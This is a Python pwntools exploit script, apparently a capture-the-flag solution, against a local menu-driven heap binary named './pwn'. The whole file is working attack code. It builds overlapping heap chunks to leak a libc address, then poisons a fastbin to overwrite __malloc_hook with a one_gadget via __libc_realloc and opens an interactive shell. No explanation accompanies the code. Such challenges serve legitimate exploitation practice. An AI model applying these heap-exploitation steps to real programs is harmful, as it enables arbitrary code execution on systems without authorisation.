#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
context.log_level = "critical"
context.binary = "./pwn"
elf = context.binary
libc = elf.libc
libc.sym["one_gadget"] = 0x4526a

def show():
    io.sendlineafter("choice:", "1")

def add(length, name):
    io.sendlineafter("choice:", "2")
    io.sendlineafter(":", str(length))
    io.sendafter(":", name)
    sleep(0.01)

def edit(idx, length, name):
    io.sendlineafter("choice:", "3")
    io.sendlineafter(":", str(idx))
    io.sendlineafter(":", str(length))
    io.sendafter(":", name)
    sleep(0.01)

def delete(idx):
    io.sendlineafter("choice:", "4")
    io.sendlineafter(":", str(idx))



io = process("./pwn")

add(0xf8, '00000000')
add(0x68, '11111111')
add(0xf8, '22222222')
add(0x10, '33333333')

delete(0)
delete(1)
add(0x68, flat('1' * 0x60, 0x170))
delete(2)

add(0xf0, 'xxxxxxxx')
show()
libc.address = u64(io.recvuntil("\x7f")[-6: ] + '\0\0') - 0x3c4b78
print("libc @ {:#x}".format(libc.address))
assert libc.address & 0xfff == 0

add(0x160, flat(0xdeadbeef))


add(0xf8, 'aaaaaaaa')
add(0x68, 'bbbbbbbb')
add(0xf8, 'cccccccc')
add(0x10, 'dddddddd')
delete(4)
delete(5)
add(0x68, flat('c' * 0x60, 0x170))
delete(6)

delete(4)
add(0x120, flat('x' * 0xf0, 0, 0x71, libc.sym["__malloc_hook"] - 0x23))

add(0x68, flat(0xdeadbeef))
#  pause()
add(0x68, flat('\0' * 0xb, libc.sym["one_gadget"], libc.sym["__libc_realloc"] + 16))

io.sendlineafter("choice:", "2")
io.sendlineafter(":", str(0xff))

io.interactive()
